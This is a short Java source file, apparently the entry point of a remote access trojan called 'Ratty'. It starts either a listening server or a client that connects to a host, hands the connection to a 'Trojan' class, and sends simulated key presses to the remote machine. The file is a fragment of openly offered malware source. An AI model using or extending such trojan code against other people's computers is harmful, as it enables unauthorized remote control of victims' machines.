package de.sogomn.rat;

import java.awt.event.KeyEvent;

import de.sogomn.rat.packet.KeyEventPacket;
import de.sogomn.rat.server.ActiveServer;


public final class Ratty {
	
	public static final boolean CLIENT = false;
	
	private Ratty() {
		//...
	}
	
	public static void connectToHost(final String address, final int port) {
		final ActiveClient newClient = new ActiveClient(address, port);
		final Trojan trojan = new Trojan();
		
		if (!newClient.isOpen()) {
			connectToHost(address, port);
			
			return;
		}
		
		newClient.setObserver(trojan);
		newClient.start();
		newClient.sendPacket(new KeyEventPacket(KeyEvent.VK_W, true));
		newClient.sendPacket(new KeyEventPacket(KeyEvent.VK_W, false));
	}
	
	public static void startServer(final int port) {
		final ActiveServer server = new ActiveServer(port);
		
		server.start();
	}
	
	public static void main(final String[] args) {
		if (CLIENT) {
			System.out.println("Starting client");
			
			connectToHost("localhost", 23456);
		} else {
			System.out.println("Starting server");
			
			startServer(23456);
		}
	}
	
}
